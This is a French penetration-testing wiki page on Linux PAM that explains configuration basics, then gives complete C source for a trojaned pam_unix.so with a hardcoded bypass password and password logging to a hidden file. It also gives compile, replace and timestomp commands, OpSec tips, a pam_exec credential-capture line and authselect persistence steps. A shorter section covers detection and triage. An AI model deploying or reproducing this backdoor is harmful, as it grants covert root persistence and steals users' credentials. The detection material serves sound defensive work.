# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informations de base

**PAM (Pluggable Authentication Modules)** agit comme un mécanisme de sécurité qui **vérifie l'identité des utilisateurs tentant d'accéder à des services informatiques**, en contrôlant leur accès selon différents critères. Il s'apparente à un gardien numérique, veillant à ce que seuls les utilisateurs autorisés puissent utiliser certains services tout en limitant potentiellement leur utilisation afin d'éviter la surcharge du système.

#### Fichiers de configuration

- **Solaris** prend en charge l'ancien fichier central `/etc/pam.conf`, mais les recommandations actuelles privilégient les fichiers de service dans `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Les systèmes Linux** privilégient une approche par répertoire, en stockant les configurations spécifiques aux services dans `/etc/pam.d`. Par exemple, le fichier de configuration du service login se trouve dans `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Un exemple de configuration PAM pour le service login pourrait se présenter ainsi :
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Domaines de gestion PAM**

Ces domaines, ou groupes de gestion, comprennent **auth**, **account**, **password** et **session**, chacun étant responsable d’aspects différents du processus d’authentification et de gestion des sessions :<sup>[[1]](#references)</sup>

- **Auth** : Valide l’identité de l’utilisateur, souvent en demandant un mot de passe.
- **Account** : Gère la vérification du compte, en contrôlant des conditions telles que l’appartenance à un groupe ou les restrictions horaires.
- **Password** : Gère les mises à jour des mots de passe, notamment les contrôles de complexité ou la prévention des dictionary attacks.
- **Session** : Gère les actions lors du démarrage ou de la fin d’une session de service, comme le montage de répertoires ou la définition de limites de ressources.

#### **Contrôles des modules PAM**

Les contrôles déterminent la réponse du module en cas de succès ou d’échec et influencent le processus global d’authentification. Ils comprennent :<sup>[[1]](#references)</sup>

- **Required** : L’échec d’un module required entraîne finalement un échec, mais seulement après la vérification de tous les modules suivants.
- **Requisite** : Met immédiatement fin au processus en cas d’échec.
- **Sufficient** : Si aucun module `required` précédent n’a échoué, le succès est immédiatement renvoyé et les modules restants du même groupe de gestion sont ignorés.
- **Optional** : N’entraîne un échec que s’il s’agit du seul module de la stack.

#### Sémantique offensive importante

Lors de l’analyse ou de la modification de PAM, **l’emplacement d’une règle insérée** détermine quelle stack la prendra en compte :<sup>[[1]](#references)[[13]](#references)</sup>

- `include` et `substack` chargent des règles depuis d’autres fichiers. Ainsi, modifier `sshd` peut n’affecter que SSH, tandis que modifier `system-auth`, `common-auth` ou une autre stack partagée peut affecter plusieurs services simultanément.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM prend également en charge des contrôles entre crochets tels que `[success=1 default=ignore]`. Ceux-ci peuvent être détournés pour **ignorer un ou plusieurs modules** après un contrôle personnalisé réussi, au lieu de remplacer visiblement `pam_unix.so`.<sup>[[1]](#references)</sup>
- Le `module-path` peut être **absolu** (`/usr/lib/security/pam_custom.so`) ou **relatif** au répertoire par défaut des modules PAM. Sur les systèmes Linux modernes, les répertoires réels sont souvent `/lib/security`, `/lib64/security`, `/usr/lib/security` ou des chemins multiarch tels que `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

À retenir pour l’opérateur : cartographiez toujours le **graphe complet des services** avant d’appliquer une modification. Par exemple, `sshd -> password-auth -> system-auth` sur certaines distributions, ou `sshd -> system-remote-login -> system-login -> system-auth` sur d’autres, signifie que le même implant d’une seule ligne peut se propager bien plus largement que prévu.<sup>[[1]](#references)[[13]](#references)</sup>

#### Exemple de scénario

Dans une configuration comportant plusieurs modules d’authentification, le processus suit un ordre strict. Si le module `pam_securetty` détecte que le terminal de connexion n’est pas autorisé, les connexions de root sont bloquées, mais tous les modules sont tout de même traités en raison de son statut « required ». Le module `pam_env` définit des variables d’environnement, ce qui peut améliorer l’expérience utilisateur. Les modules `pam_ldap` et `pam_unix` collaborent pour authentifier l’utilisateur, `pam_unix` tentant d’utiliser un mot de passe fourni précédemment, ce qui améliore l’efficacité et la flexibilité des méthodes d’authentification.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Une technique classique de persistence dans les environnements Linux sensibles consiste à **remplacer la bibliothèque PAM légitime par un drop-in trojanisé**. Sur un hôte dont la stack PAM charge `pam_unix.so`, l’authentification SSH ou console peut appeler son point d’entrée `pam_sm_authenticate()` ; un remplacement malveillant peut capturer les credentials ou implémenter un contournement par mot de passe *magique*.<sup>[[2]](#references)[[11]](#references)</sup>

### Aide-mémoire de compilation
Le schéma ci-dessous utilise le point d’entrée de service `pam_sm_authenticate()` de Linux-PAM ainsi que `pam_get_authtok()` pour accéder au token d’authentification.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compilez et effectuez un stealth-replace (le pattern replacement/timestomp est documenté par Unit 42). Ajustez à la fois le chemin de backup codé en dur dans le wrapper et les commandes ci-dessous afin qu'ils correspondent au répertoire réel des modules PAM de la cible&nbsp;:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Conseils OpSec
1. **Réécriture atomique** – écrire une bibliothèque complète dans un fichier temporaire, puis la renommer à son emplacement afin d’éviter de laisser un module d’authentification partiellement écrit.
2. Un chemin tel que `/usr/bin/.dbus.log` a été observé dans l’analyse d’AuthDoor par Unit 42 ; il constitue donc également un indicateur utile pour le hunting.<sup>[[2]](#references)</sup>
3. Préserver les points d’entrée attendus par la pile PAM (par exemple, `pam_sm_authenticate` et `pam_sm_setcred`) afin que les autres opérations de gestion continuent de fonctionner.<sup>[[11]](#references)[[18]](#references)</sup>

### Détection
Pour les vérifications d’intégrité des paquets, RPM vérifie les métadonnées des fichiers installés, `debsums -s` signale les erreurs de checksum et `dpkg -S`, dans le bloc de triage, interroge la propriété des paquets ; la syntaxe de surveillance d’audit enregistre les écritures et les changements d’attributs d’un chemin.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Comparer les valeurs MD5/SHA256 de `pam_unix.so` avec celles du paquet de la distribution.
* Utiliser `rpm -V pam` ou `debsums -s libpam-modules` pour repérer les bibliothèques remplacées sans calcul manuel des hashs.
* Vérifier la présence de permissions d’écriture pour tous ou d’une propriété inhabituelle sous `/lib/security/`.
* Règle `auditd` : `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Rechercher dans les configurations PAM les modules inattendus : `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Commandes de triage rapide (après compromission ou pour le threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abuser de `pam_exec` pour la persistance
Au lieu de remplacer `pam_unix.so`, une approche moins intrusive consiste à ajouter une ligne `pam_exec` dans `/etc/pam.d/sshd`, afin qu'une invocation qui atteint cette ligne PAM exécute un helper tout en laissant la pile normale intacte.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` reçoit les métadonnées PAM dans des variables d’environnement telles que `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` et `PAM_TYPE`. Avec `expose_authtok`, le helper peut lire jusqu’à `PAM_MAX_RESP_SIZE` octets du mot de passe depuis `stdin` pendant les phases `auth` ou `password`. Si vous voulez que le helper s’exécute avec l’UID effectif plutôt qu’avec l’UID réel, ajoutez `seteuid`.<sup>[[4]](#references)</sup>

Les remarques pratiques suivantes concernent les types de module et le filtre `type=` documentés pour `pam_exec` :<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` est préférable pour les **actions post-login**, comme la réouverture de sockets ou le lancement d’un daemon détaché.
- `auth optional pam_exec.so quiet expose_authtok ...` est le choix habituel pour la **capture de credentials**, car il s’exécute avant l’ouverture de la session.
- `type=session` ou `type=auth` peut être utilisé pour limiter l’exécution à une phase PAM spécifique et éviter une double exécution générant du bruit.

### Résister aux outils de la distro : `authselect`

Sur les systèmes de la famille RHEL et Fedora qui utilisent `authselect`, les modifications directes de fichiers générés tels que `/etc/pam.d/system-auth` ou `/etc/pam.d/password-auth` peuvent être **écrasées par `authselect`**. Pour assurer la persistance, les opérateurs modifient souvent le profil custom actif sous `/etc/authselect/custom/<profile>/`, puis le sélectionnent à nouveau.<sup>[[5]](#references)[[19]](#references)</sup>

Procédure typique lorsque vous avez les privilèges root :<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Cela est important à la fois pour l'offensive et le triage : si `/etc/pam.d/system-auth` contient la bannière `Generated by authselect` et `Do not modify this file manually`, alors le véritable point de persistence peut se trouver sous `/etc/authselect/custom/` plutôt que dans `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft récent observé dans la nature

Les rapports récents de 2025 sur la backdoor Linux **Plague** ont montré la même idée fondamentale poussée plus loin : un composant PAM malveillant doté d'un **mot de passe de bypass statique**, ainsi que le nettoyage des variables d'environnement liées à SSH et de l'historique du shell (`HISTFILE=/dev/null`) afin de réduire les traces de session après la connexion.<sup>[[3]](#references)</sup> Il s'agit d'un modèle de recherche utile, car la logique de la backdoor peut se trouver dans PAM, tandis que les artefacts de furtivité n'apparaissent qu'**après la réussite de l'authentification**.


## References

- [1] [pam.conf(5) / pam.d(5) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Le manuel de l'opérateur clandestin : infiltration des réseaux mondiaux de télécommunications - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague : une nouvelle backdoor basée sur PAM pour Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configuration de l'authentification utilisateur avec authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Pages de manuel Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Page de manuel Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Pages de manuel Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Gestion de l'authentification dans Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guide de l'authentification au niveau système - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Liste des fichiers du package Ubuntu : libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Pages de manuel Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Modifications/Make Authselect Mandatory - Wiki du Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
